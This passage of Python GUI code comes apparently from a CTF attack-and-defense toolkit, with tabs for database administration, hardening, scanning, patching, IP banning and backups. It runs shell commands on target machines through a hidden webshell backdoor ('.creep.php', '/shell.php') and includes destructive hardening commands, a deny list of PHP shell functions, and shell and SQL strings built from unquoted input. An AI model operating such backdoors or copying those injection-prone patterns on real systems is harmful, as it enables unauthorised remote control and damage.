        self.db_ssh_port = tb.Entry(r1, width=4); self.db_ssh_port.insert(0, '2202'); self.db_ssh_port.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='用户:').pack(side=tk.LEFT)
        self.db_ssh_user = tb.Entry(r1, width=8); self.db_ssh_user.insert(0, 'ctf'); self.db_ssh_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT)
        self.db_ssh_pass = tb.Entry(r1, width=12); self.db_ssh_pass.pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='MySQL用户:').pack(side=tk.LEFT)
        self.db_user = tb.Entry(r2, width=8); self.db_user.insert(0, 'root'); self.db_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='MySQL密码:').pack(side=tk.LEFT)
        self.db_pass = tb.Entry(r2, width=12); self.db_pass.insert(0, 'root'); self.db_pass.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='数据库:').pack(side=tk.LEFT, padx=(6,0))
        self.db_name = tb.Entry(r2, width=12); self.db_name.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='表:').pack(side=tk.LEFT)
        self.db_table = tb.Entry(r2, width=12); self.db_table.pack(side=tk.LEFT, padx=2)
        r3 = tb.Frame(f1); r3.pack(fill=tk.X, pady=2)
        tb.Button(r3, text='\U0001f50d 查询库', command=self.do_db_show).pack(side=tk.LEFT, padx=2)
        tb.Button(r3, text='\U0001f4e5 备份DB', command=self.do_db_dump).pack(side=tk.LEFT, padx=2)
        tb.Button(r3, text='\U0001f504 改DB密码', command=self.do_db_chpass).pack(side=tk.LEFT, padx=2)
        tb.Label(r3, text='新DB密码:').pack(side=tk.LEFT, padx=(6,0))
        self.db_newpass = tb.Entry(r3, width=10); self.db_newpass.pack(side=tk.LEFT, padx=2)
        r4 = tb.Frame(f1); r4.pack(fill=tk.X, pady=2)
        tb.Button(r4, text='\U0001f3ed 建库', command=self.do_db_create, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(r4, text='\U0001f5c2 查表', command=self.do_db_tables, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(r4, text='\U0001f4ca 看数据', command=self.do_db_data, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Label(r4, text='SQL:').pack(side=tk.LEFT, padx=(8,0))
        self.db_sql = tb.Entry(r4); self.db_sql.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r4, text='\u25b6 执行', command=self.do_db_sql, bootstyle='success').pack(side=tk.LEFT, padx=2)
        self.db_lw = self._log_frame(f)

    def _db_cmd(self, cmd, timeout=10):
        import base64 as _b64
        db_user = self.db_user.get().strip()
        db_pass = self.db_pass.get().strip()
        b64 = _b64.b64encode(cmd.encode('utf-8')).decode('ascii')
        return self._ssh_connect(self.db_ip.get().strip(), self.db_ssh_port.get(),
            self.db_ssh_user.get(), self.db_ssh_pass.get(),
            f"echo {b64} | base64 -d | mysql -u{db_user} -p'{db_pass}' 2>&1", timeout=timeout)

    def do_db_show(self):
        self.db_lw.log('>>> 查询数据库列表', 'info')
        r = self._db_cmd('SHOW DATABASES')
        self.db_lw.log(r[:1000], 'out')

    def do_db_create(self):
        name = self.db_name.get().strip()
        if not name: messagebox.showwarning('提示', '请填写数据库名'); return
        if not re.match(r'^[A-Za-z0-9_\-\.]+$', name):
            messagebox.showwarning('提示', '数据库名含非法字符'); return
        self.db_lw.log(f'>>> 建库: {name}', 'info')
        r = self._db_cmd(f"CREATE DATABASE IF NOT EXISTS `{name}` DEFAULT CHARACTER SET utf8mb4")
        self.db_lw.log(r[:500] or '[OK] 建库成功', 'ok' if not r.strip() else 'fail')

    def do_db_tables(self):
        name = self.db_name.get().strip()
        if not name: messagebox.showwarning('提示', '请填写数据库名'); return
        self.db_lw.log(f'>>> 表列表: {name}', 'info')
        r = self._db_cmd(f"SHOW TABLES FROM `{name}`")
        self.db_lw.log(r[:1500], 'out')

    def do_db_data(self):
        name = self.db_name.get().strip()
        table = self.db_table.get().strip()
        if not name or not table: messagebox.showwarning('提示', '请填写数据库名和表名'); return
        self.db_lw.log(f'>>> 查询数据: {name}.{table} LIMIT 50', 'info')
        def run():
            r = self._db_cmd(f"SELECT * FROM `{name}`.`{table}` LIMIT 50", timeout=20)
            self.db_lw.log(r[:4000] or '[无数据]', 'out')
        async_run(run)

    def do_db_sql(self):
        q = self.db_sql.get().strip()
        if not q: messagebox.showwarning('提示', '请输入SQL语句'); return
        self.db_lw.log(f'>>> 执行SQL: {q[:120]}', 'info')
        qs = q.rstrip(';')
        if re.match(r'^(INSERT|UPDATE|DELETE|DROP|TRUNCATE|ALTER|RENAME)\b', qs, re.I):
            if not messagebox.askyesno('写操作确认', f'该SQL为写操作：\n{qs}\n\n确认执行？'):
                return
        def run():
            r = self._db_cmd(qs, timeout=20)
            self.db_lw.log(r[:4000] or '[OK] 执行完成', 'ok' if not r.strip() else 'out')
        async_run(run)

    def do_db_dump(self):
        ip = self.db_ip.get().strip()
        self.db_lw.log(f'>>> 备份数据库 {ip}', 'info')
        def run():
            fname = f'db_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.sql.gz'
            cmd = f'mysqldump -u{self.db_user.get().strip()} -p{self.db_pass.get().strip()} --all-databases 2>/dev/null | gzip -c | base64 -w0'
            r = self._ssh_connect(ip, self.db_ssh_port.get(), self.db_ssh_user.get(), self.db_ssh_pass.get(), cmd, timeout=30)
            if r.startswith('[ERROR]'): self.db_lw.log(f'[FAIL] {r}', 'fail')
            else:
                out = os.path.join(CONFIG_DIR, fname)
                with open(out, 'wb') as fh:
                    try: fh.write(base64.b64decode(r))
                    except Exception: fh.write(r.encode())
                sz = os.path.getsize(out)
                self.db_lw.log(f'[OK] 备份保存: {os.path.join(CONFIG_DIR, fname)} ({sz/1024:.1f}KB)', 'ok')
        async_run(run)

    def do_db_chpass(self):
        np = self.db_newpass.get().strip()
        if not np: messagebox.showwarning('提示', '请输入新密码'); return
        self.db_lw.log('>>> 修改MySQL密码', 'info')
        r = self._db_cmd(f"ALTER USER '{self.db_user.get().strip()}'@'localhost' IDENTIFIED BY '{np}'; FLUSH PRIVILEGES;")
        self.db_lw.log(r[:300], 'ok' if not r.strip() or 'OK' in r else 'fail')

    # ── 加固基线 ──
    def build_harden(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        e_ip, ep, vh, et = self._target_frame(f)
        self.harden_ip, self.harden_port, self.harden_https, self.harden_to = e_ip, ep, vh, et
        bf = self._btn_frame(f)
        tb.Label(bf, text='操作:').pack(side=tk.LEFT)
        self.harden_lw = self._log_frame(f)
        # (名称, 命令, 是否破坏性需确认)
        cmds = [
            ('Web目录只读', 'for d in /var/www/html /app/web /var/www /web /www; do [ -d "$d" ] && { find "$d" -type d -exec chmod 755 {} \\; 2>/dev/null; find "$d" -type f -exec chmod 644 {} \\; 2>/dev/null; }; done; echo DONE', True),
            ('PHP危险函数禁用', 'for f in /etc/php/*/php.ini /etc/php.ini; do sed -i "s/disable_functions =.*/disable_functions = exec,system,passthru,shell_exec,popen,proc_open,pcntl_exec,assert,pcntl_fork/" "$f" 2>/dev/null; done; echo DONE', False),
            ('目录列表禁用', 'for f in /etc/apache2/sites-enabled/* /etc/apache2/conf-enabled/* /etc/nginx/conf.d/* /etc/nginx/nginx.conf; do sed -i -e "s/Options.*Indexes/Options -Indexes/" -e "s/autoindex\\s\\+on/autoindex off/" "$f" 2>/dev/null; done; echo DONE', False),
            ('删除多余用户', 'userdel -r www 2>/dev/null; userdel -r test 2>/dev/null; userdel -r ftp 2>/dev/null; userdel -r backup 2>/dev/null; echo DONE', True),
            ('停止无用服务', 'systemctl stop vsftpd 2>/dev/null; systemctl disable vsftpd 2>/dev/null; systemctl stop telnet 2>/dev/null; echo DONE', True),
            ('关闭3389', 'iptables -A INPUT -p tcp --dport 3389 -j DROP 2>/dev/null; echo DONE', False),
        ]
        self._harden_cmds = cmds
        for name, cmd, destructive in cmds:
            tb.Button(bf, text=name,
                command=lambda c=cmd, n=name, d=destructive: self.do_harden(e_ip, ep, vh, et, c, name=n, destructive=d)
            ).pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(f); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='或输入自定义命令:').pack(side=tk.LEFT)
        self.harden_custom = tb.Entry(r2); self.harden_custom.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r2, text='\u25b6 执行', command=lambda: self.do_harden(e_ip, ep, vh, et, self.harden_custom.get(), name='自定义命令')).pack(side=tk.LEFT, padx=2)

    def do_harden(self, e_ip, ep, vh, et, cmd, name='', destructive=False):
        if not cmd: return
        ips = parse_targets(e_ip.get().strip())
        if not ips: return
        if destructive:
            if not messagebox.askyesno('破坏性操作确认',
                    f'【{name}】\n\n该加固操作可能影响靶机可用性：\n'
                    f'· Web目录只读 → 之后无法写入webshell/文件\n'
                    f'· 删除多余用户 → 误删无法恢复\n'
                    f'· 停止无用服务 → 相关服务不可用\n\n'
                    f'确认对 {len(ips)} 台靶机执行？'):
                return
        port = int(ep.get() or 80); timeout = int(et.get() or 10)
        lw = self.harden_lw
        lw.log(f'>>> 执行加固命令: {cmd[:60]}...', 'info')
        def run():
            for ip in ips[:5]:
                try:
                    base = make_base(ip, port, vh.get())
                    r = requests.post(f'{base}/.creep.php',
                        headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd}, timeout=timeout)
                    lw.log(f'  [{ip}] {r.text[:100]}', 'ok' if r.status_code==200 else 'fail')
                except Exception as e: lw.log(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)


    # ── 自动修复 ──
    def build_autofix(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        pad = {'padx': 4, 'pady': 2}

        f1 = tb.LabelFrame(f, text='目标配置'); f1.pack(fill=tk.X, **pad)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, **pad)
        tb.Label(r1, text='IP/网段:').pack(side=tk.LEFT)
        self.af_ip = tb.Entry(r1); self.af_ip.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r1, text='端口:').pack(side=tk.LEFT)
        self.af_port = tb.Entry(r1, width=5); self.af_port.insert(0, '80'); self.af_port.pack(side=tk.LEFT, padx=2)
        self.af_https = tk.BooleanVar()
        tb.Checkbutton(r1, text='HTTPS', variable=self.af_https).pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='路径:').pack(side=tk.LEFT, padx=(6,0))
        self.af_shell = tb.Entry(r1, width=12); self.af_shell.insert(0, '/shell.php'); self.af_shell.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT, padx=(2,0))
        self.af_pass = tb.Entry(r1, width=8); self.af_pass.insert(0, 'cmd'); self.af_pass.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='超时:').pack(side=tk.LEFT, padx=(6,0))
        self.af_to = tb.Entry(r1, width=3); self.af_to.insert(0, '10'); self.af_to.pack(side=tk.LEFT, padx=2)

        f2 = tb.LabelFrame(f, text='操作'); f2.pack(fill=tk.X, **pad)
        r2 = tb.Frame(f2); r2.pack(fill=tk.X, **pad)
        tb.Button(r2, text='\U0001f50d 远程扫描漏洞', command=self.af_scan_remote, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f4c2 本地扫描目录', command=self.af_scan_local, bootstyle='info').pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f527 生成+部署补丁', command=self.af_deploy_patch, bootstyle='success').pack(side=tk.LEFT, padx=8)
        tb.Button(r2, text='\U0001f5d1 清除日志', command=lambda: self.af_log.clear()).pack(side=tk.LEFT, padx=2)

        r_stat = tb.Frame(f2); r_stat.pack(fill=tk.X, **pad)
        self.af_lbl_stat = tb.Label(r_stat, text='就绪', foreground='#6b7f9e')
        self.af_lbl_stat.pack(side=tk.LEFT)

        f3 = tb.LabelFrame(f, text='漏洞发现列表'); f3.pack(fill=tk.BOTH, expand=True, **pad)
        r3 = tb.Frame(f3); r3.pack(fill=tk.BOTH, expand=True)
        self.af_tree = tb.Treeview(r3, columns=('sev','name','file','line','match'), show='headings', height=6)
        self.af_tree.heading('sev', text='级别'); self.af_tree.column('sev', width=60)
        self.af_tree.heading('name', text='漏洞类型'); self.af_tree.column('name', width=120)
        self.af_tree.heading('file', text='文件'); self.af_tree.column('file', width=200)
        self.af_tree.heading('line', text='行号'); self.af_tree.column('line', width=50)
        self.af_tree.heading('match', text='匹配内容'); self.af_tree.column('match', width=300)
        vsb = tb.Scrollbar(r3, orient='vertical', command=self.af_tree.yview)
        self.af_tree.configure(yscrollcommand=vsb.set)
        self.af_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True); vsb.pack(side=tk.RIGHT, fill=tk.Y)

        for tag, fg in [('critical','#ff4d6d'),('high','#ffcc00'),('medium','#00d4ff'),('low','#6b7f9e')]:
            self.af_tree.tag_configure(tag, foreground=fg)

        flog = tb.LabelFrame(f, text='日志'); flog.pack(fill=tk.X, **pad)
        self.af_log = LogWidget(flog)
        self._af_findings = []

    def af_log_msg(self, msg, tag='info'):
        if hasattr(self, 'af_log'):
            self.af_log.log(f'[{datetime.now().strftime("%H:%M:%S")}] {msg}', tag)

    def af_scan_remote(self):
        ips = parse_targets(self.af_ip.get().strip())
        if not ips: messagebox.showwarning('', '请输入目标IP'); return
        port = safe_int(self.af_port.get(), 80)
        timeout = safe_int(self.af_to.get(), 10)
        https = self.af_https.get()
        self._af_findings = []
        for item in self.af_tree.get_children(): self.af_tree.delete(item)
        self.af_lbl_stat.config(text='扫描中...', foreground='#ffcc00')

        def run():
            _try_add_path(os.path.join(BASE, '防御模块'))
            from auto_fix import VulnScanner
            total = len(ips)
            for i, ip in enumerate(ips, 1):
                self.af_log_msg(f'扫描 [{i}/{total}] {ip}...', 'info')
                try:
                    s = VulnScanner()
                    # 通过蠕虫通道获取文件列表
                    file_list_cmd = "find /var/www/html /app/web /var/www /web /www -type f \\( -name '*.php' -o -name '*.py' -o -name '*.jsp' -o -name '*.js' \\) 2>/dev/null | head -100"
                    file_list = self._exec_cmd(ip, file_list_cmd, port, https, timeout)
                    files = []
                    if file_list:
                        for line in file_list.split('\n'):
                            line = line.strip()
                            if line and line.endswith(('.php','.py','.jsp','.js')):
                                files.append(line)
                    self.af_log_msg(f'  发现 {len(files)} 个源码文件', 'info')
                    # 逐个读取文件内容并扫描
                    for fp in list(set(files))[:50]:
                        try:
                            content = self._exec_cmd(ip, f'cat {fp}', port, https, timeout)
                            if content:
                                findings = s.scan_file(fp, content)
                                s.findings.extend(findings)
                        except Exception:
                            pass
                    s.stats['scanned'] = len(set(files))
                    self._af_findings.extend(s.findings)
                except Exception as e:
                    self.af_log_msg(f'[FAIL] {ip}: {e}', 'fail')
                if hasattr(self, 'af_lbl_stat'):
                    self.root.after(0, lambda c=f'扫描中 {i}/{total}': self.af_lbl_stat.config(text=c, foreground='#ffcc00'))
            self.root.after(0, self.af_refresh_tree)
            summary = f"扫描完成: {len(self._af_findings)} 个发现"
            self.af_log_msg(summary, 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(self._af_findings)} 个发现', foreground='#00ff9d'))
        async_run(run)

    def af_scan_local(self):
        path = filedialog.askdirectory(title='选择源码目录')
        if not path: return
        self._af_findings = []
        for item in self.af_tree.get_children(): self.af_tree.delete(item)
        self.af_lbl_stat.config(text='扫描中...', foreground='#ffcc00')
        self.af_log_msg(f'扫描本地目录: {path}', 'info')

        def run():
            _try_add_path(os.path.join(BASE, '防御模块'))
            from auto_fix import VulnScanner
            s = VulnScanner()
            s.scan_directory(path)
            self._af_findings = s.findings
            self.root.after(0, self.af_refresh_tree)
            self.af_log_msg(s.summary(), 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(s.findings)} 个发现', foreground='#00ff9d'))
        async_run(run)

    def af_refresh_tree(self):
        for item in self.af_tree.get_children(): self.af_tree.delete(item)
        for f in self._af_findings:
            sev = f['severity']
            tag = sev if sev in ('critical','high','medium','low') else 'medium'
            self.af_tree.insert('', 'end', values=(
                sev.upper(), f['name'],
                f.get('remote_file', f.get('file', '?')),
                f['line'], f['match'][:80]
            ), tags=(tag,))

    def af_deploy_patch(self):
        if not self._af_findings:
            messagebox.showwarning('', '请先扫描漏洞')
            return
        ips = parse_targets(self.af_ip.get().strip())
        if not ips: messagebox.showwarning('', '请输入目标IP'); return
        port = safe_int(self.af_port.get(), 80)
        timeout = safe_int(self.af_to.get(), 10)
        shell_url = self.af_shell.get().strip() or '/shell.php'
        shell_pass = self.af_pass.get().strip() or 'cmd'
        https = self.af_https.get()
        ip = ips[0]

        sev_count = sum(1 for f in self._af_findings if f['severity'] in ('critical','high'))
        msg = f'发现 {len(self._af_findings)} 个漏洞(高危{sev_count}个)\n部署自动补丁到 {ip}？'
        if not messagebox.askyesno('确认部署', msg): return

        self.af_log_msg(f'>>> 生成补丁...', 'warn')
        async_run(lambda: self._af_deploy(ip, port, shell_url, shell_pass, https, timeout))

    def _af_deploy(self, ip, port, shell_url, shell_pass, https, timeout):
        try:
            _try_add_path(os.path.join(BASE, '防御模块'))
            from patch_deploy import PatchGenerator, PatchDeployer
            pg = PatchGenerator()
            patches = pg.generate_patches(self._af_findings)
            self.af_log_msg(f'生成 {len(patches)} 个补丁方案', 'info')

            waf_code = pg.generate_waf_patch(patches)
            pd = PatchDeployer()

            if waf_code:
                ok = pd.deploy_via_webshell(ip, port, shell_url, shell_pass, waf_code,
                    '/var/www/html/.yl_patch.php', https, timeout)
                self.af_log_msg(f'WAF补丁部署: {"✓" if ok else "✗"}', 'ok' if ok else 'fail')

            user_ini = "auto_prepend_file = /var/www/html/.yl_patch.php\n"
            ok = pd.deploy_via_webshell(ip, port, shell_url, shell_pass, user_ini,
                '/var/www/html/.user.ini', https, timeout)
            self.af_log_msg(f'自动加载部署: {"✓" if ok else "✗"}', 'ok' if ok else 'fail')

            for p in patches:
                self.af_log_msg(f'  [{p["severity"].upper()}] {p["name"]} ({p["count"]}处)', 'info')
                self.af_log_msg(f'    快速修复: {p["fix_fast"]}', 'out')
                self.af_log_msg(f'    安全修复: {p["fix_secure"]}', 'out')

            self.af_log_msg('>>> 自动修复完成', 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text='补丁已部署', foreground='#00ff9d'))
        except Exception as e:
            self.af_log_msg(f'部署失败: {e}', 'fail')

    # ── IP黑名单 ──
    def build_ipban(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='IP黑名单管理', padding=4); f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='目标靶机:').pack(side=tk.LEFT)
        self.ban_ip_entry = tb.Entry(r1); self.ban_ip_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r1, text='Web端口:').pack(side=tk.LEFT)
        self.ban_port = tb.Entry(r1, width=6); self.ban_port.insert(0, '8804'); self.ban_port.pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='要封禁的IP:').pack(side=tk.LEFT)
        self.ban_target = tb.Entry(r2, width=20); self.ban_target.pack(side=tk.LEFT, padx=4)
        tb.Button(r2, text='\U0001f6ab 封禁', command=self.do_ipban, bootstyle='danger').pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f513 解封', command=self.do_ipunban, width=6).pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='\U0001f50d 列表', command=self.do_ipban_list, width=6).pack(side=tk.LEFT, padx=2)
        r3 = tb.Frame(f1); r3.pack(fill=tk.X, pady=2)
        tb.Label(r3, text='批量从文件封禁:').pack(side=tk.LEFT)
        self.ban_file = tb.Entry(r3); self.ban_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r3, text='\U0001f4c2 选择文件', command=lambda: pick_file(self.ban_file)).pack(side=tk.LEFT, padx=2)
        tb.Button(r3, text='\U0001f525 批量封禁', command=self.do_ipban_batch, bootstyle='danger').pack(side=tk.LEFT, padx=2)
        self.ban_lw = self._log_frame(f)

    def _ban_cmd(self, action, target_ip, ips):
        """action: 'add'/'del'。经蠕虫执行 PHP CLI 管理 .waf.dat 黑名单(K), 应用层封禁(真生效)"""
        if not ips or not target_ip: return None
        port = safe_int(self._get_ep_port(), 80)
        # 动态查找 waf_ban.php 路径
        find_cmd = 'find /var/www/html /app/web /var/www /web /www -name waf_ban.php -print -quit 2>/dev/null'
        try:
            base_f = make_base(target_ip, port, False)
            r_find = _session().post(f'{base_f}/.creep.php',
                headers={'X-Creep': cfg.get('password', 'cmd'), 'X-Cmd': find_cmd}, timeout=8)
            ban_path = (r_find.text or '').strip() or '/var/www/html/waf_ban.php'
        except Exception:
            ban_path = '/var/www/html/waf_ban.php'
        cmd = '; '.join([f'php {ban_path} {action} {ip}' for ip in ips])
        try:
            base = make_base(target_ip, port, False)
            r = _session().post(f'{base}/.creep.php',
                headers={'X-Creep': cfg.get('password', 'cmd'), 'X-Cmd': cmd}, timeout=15)
            txt = r.text or ''
            return 'OK:' in txt and 'NO_DAT' not in txt and 'BAD' not in txt
        except Exception: return False

    def _get_ep_port(self):
        try:
            if hasattr(self, 'ban_port') and self.ban_port.get().strip():
                return int(self.ban_port.get().strip())
        except Exception: pass
        try:
            if hasattr(self, 'entry_port') and self.entry_port.get().strip():
                return int(self.entry_port.get().strip() or 80)
        except Exception: pass
        try:
            if hasattr(self, 'af_port'):
                return int(self.af_port.get() or 80)
        except Exception: pass
        return 80

    def do_ipban(self):
        ip = self.ban_ip_entry.get().strip()
        target = self.ban_target.get().strip()
        if not ip or not target: messagebox.showwarning('', '请填写目标靶机和封禁IP'); return
        ok = self._ban_cmd('add', ip, [target])
        self.ban_lw.log(f'[{"OK" if ok else "FAIL"}] 封禁 {target} (应用层, {ip})', 'ok' if ok else 'fail')

    def do_ipunban(self):
        ip = self.ban_ip_entry.get().strip()
        target = self.ban_target.get().strip()
        if not ip or not target: return
        ok = self._ban_cmd('del', ip, [target])
        self.ban_lw.log(f'[{"OK" if ok else "FAIL"}] 解封 {target} ({ip})', 'ok' if ok else 'fail')

    def do_ipban_list(self):
        ip = self.ban_ip_entry.get().strip()
        if not ip: return
        try:
            base = make_base(ip, self._get_ep_port(), False)
            r = _session().post(f'{base}/.creep.php',
                headers={'X-Creep': 'cmd', 'X-Cmd': 'php /var/www/html/waf_ban.php list'}, timeout=10)
            self.ban_lw.log(f'[{ip}] 黑名单列表: {r.text.strip()[:1500]}', 'out')
        except Exception as e: self.ban_lw.log(f'[FAIL] {e}', 'fail')

    def do_ipban_batch(self):
        fpath = self.ban_file.get().strip()
        ip = self.ban_ip_entry.get().strip()
        if not fpath or not os.path.exists(fpath) or not ip: messagebox.showwarning('', '请填写目标IP并选择IP文件'); return
        try:
            with open(fpath) as f: ips = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            ok = self._ban_cmd('add', ip, ips)
            self.ban_lw.log(f'[{"OK" if ok else "FAIL"}] 批量封禁 {len(ips)} 个IP', 'ok' if ok else 'fail')
        except Exception as e: self.ban_lw.log(f'[FAIL] {e}', 'fail')

    # ── 定时备份 ──
    def build_sched_backup(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='定时自动备份配置', padding=4); f1.pack(fill=tk.X)
        # 连接模式
        r_mode = tb.Frame(f1); r_mode.pack(fill=tk.X, pady=2)
        tb.Label(r_mode, text='备份类型:').pack(side=tk.LEFT)
        self.sb_mode = tk.StringVar(value='ssh')
        for val, txt in [('ssh', '🔑 SSH远程(靶机)'), ('local', '📁 本地目录')]:
            tb.Radiobutton(r_mode, text=txt, variable=self.sb_mode, value=val,
                command=self._switch_sb_mode).pack(side=tk.LEFT, padx=6)
        # SSH面板
        self.sb_ssh = tk.Frame(f1)
        r1 = tb.Frame(self.sb_ssh); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='SSH:').pack(side=tk.LEFT)
        self.sb_ssh_host = tb.Entry(r1, width=15); self.sb_ssh_host.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='端口:').pack(side=tk.LEFT)
        self.sb_ssh_port = tb.Entry(r1, width=5); self.sb_ssh_port.insert(0, '2202'); self.sb_ssh_port.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='用户:').pack(side=tk.LEFT)
        self.sb_ssh_user = tb.Entry(r1, width=8); self.sb_ssh_user.insert(0, 'ctf'); self.sb_ssh_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT)
        self.sb_ssh_pass = tb.Entry(r1, width=12); self.sb_ssh_pass.pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(self.sb_ssh); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='远程Web目录:').pack(side=tk.LEFT)
        self.sb_webdir = tb.Entry(r2); self.sb_webdir.insert(0, '/var/www/html')
        self.sb_webdir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.sb_ssh.pack(fill=tk.X)
        # 本地面板
        self.sb_local = tk.Frame(f1)
        r1l = tb.Frame(self.sb_local); r1l.pack(fill=tk.X, pady=2)
        tb.Label(r1l, text='本地目录:').pack(side=tk.LEFT)
        self.sb_local_dir = tb.Entry(r1l); self.sb_local_dir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r1l, text='\U0001f4c2 选择', command=lambda: pick_dir(self.sb_local_dir)).pack(side=tk.LEFT)
        self.sb_local.pack_forget()
        r3 = tb.Frame(f1); r3.pack(fill=tk.X, pady=2)
        tb.Label(r3, text='备份保存到:').pack(side=tk.LEFT)
        self.sb_bakdir = tb.Entry(r3, width=30)
        default_bak = self._bak_dir()
        self.sb_bakdir.insert(0, default_bak)
        self.sb_bakdir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r3, text='\U0001f4c2 选择', command=lambda: pick_dir(self.sb_bakdir)).pack(side=tk.LEFT)
        tb.Button(r3, text='\U0001f4c2 打开', command=self._open_sb_dir).pack(side=tk.LEFT, padx=(2,0))
        r4 = tb.Frame(f1); r4.pack(fill=tk.X, pady=2)
        self.sb_running = False
        self.btn_sb_start = tb.Button(r4, text='\u25b6 开始定时备份', command=self.toggle_sched_backup, width=18)
        self.btn_sb_start.pack(side=tk.LEFT, padx=2)
        tb.Label(r4, text='间隔:').pack(side=tk.LEFT, padx=(8,0))
        self.sb_interval = tb.Entry(r4, width=4); self.sb_interval.insert(0, '10')
        self.sb_interval.pack(side=tk.LEFT, padx=2)
        tb.Label(r4, text='分钟').pack(side=tk.LEFT)
        self.sb_lbl = tb.Label(r4, text='\u23f8 未启动', foreground='#6b7f9e')
        self.sb_lbl.pack(side=tk.LEFT, padx=12)
        r5 = tb.Frame(f1); r5.pack(fill=tk.X, pady=2)
        tb.Label(r5, text='最近备份:').pack(side=tk.LEFT)
        self.sb_last = tb.Label(r5, text='无', foreground='#6b7f9e')
        self.sb_last.pack(side=tk.LEFT, padx=4)
        self.sb_lw = self._log_frame(f)

    def _switch_sb_mode(self):
        mode = self.sb_mode.get()
        if mode == 'ssh':
            self.sb_local.pack_forget()
            self.sb_ssh.pack(fill=tk.X)
        else:
            self.sb_ssh.pack_forget()
            self.sb_local.pack(fill=tk.X)

    def _open_sb_dir(self):
        d = self.sb_bakdir.get().strip() or self._bak_dir()
        try: os.makedirs(d, exist_ok=True); os.startfile(d)
        except Exception as e: messagebox.showerror('错误', f'无法打开备份目录: {e}')

    def toggle_sched_backup(self):
        if self.sb_running:
            self.sb_running = False
            self.btn_sb_start.config(text='\u25b6 开始定时备份')
            self.sb_lbl.config(text='\u23f8 已停止', foreground='#6b7f9e')
            return
        mode = self.sb_mode.get()
        wd = self.sb_webdir.get().strip() if mode == 'ssh' else self.sb_local_dir.get().strip()
        if not wd:
            messagebox.showwarning('', '请填写要备份的目录'); return
        if mode == 'ssh' and not self.sb_ssh_host.get().strip():
            messagebox.showwarning('', '请填写SSH主机'); return
        self.sb_running = True
        self.btn_sb_start.config(text='\u23f9 停止')
        interval = max(1, int(self.sb_interval.get() or 10))
        self.sb_lbl.config(text=f'\u23f3 每{interval}分钟', foreground='#00ff9d')
        bd = self.sb_bakdir.get().strip() or self._bak_dir()
        cfg = {
            'mode': mode, 'webdir': wd, 'bakdir': bd,
            'host': self.sb_ssh_host.get().strip(),
            'sport': self.sb_ssh_port.get().strip() or '2202',
            'suser': self.sb_ssh_user.get().strip() or 'ctf',
            'spass': self.sb_ssh_pass.get().strip(),
        }
        def run():
            import tarfile
            import paramiko
            try: os.makedirs(bd, exist_ok=True)
            except Exception: pass
            last_ok = None
            while self.sb_running:
                try:
                    fname = f'auto_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.tar.gz'
                    fpath = os.path.join(bd, fname)
                    if cfg['mode'] == 'ssh':
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(cfg['host'], int(cfg['sport']), cfg['suser'], cfg['spass'],
                                    timeout=15, allow_agent=False, look_for_keys=False)
                        import ntpath
                        parent_dir = ntpath.dirname(cfg['webdir'].rstrip('/')) or '/var/www'
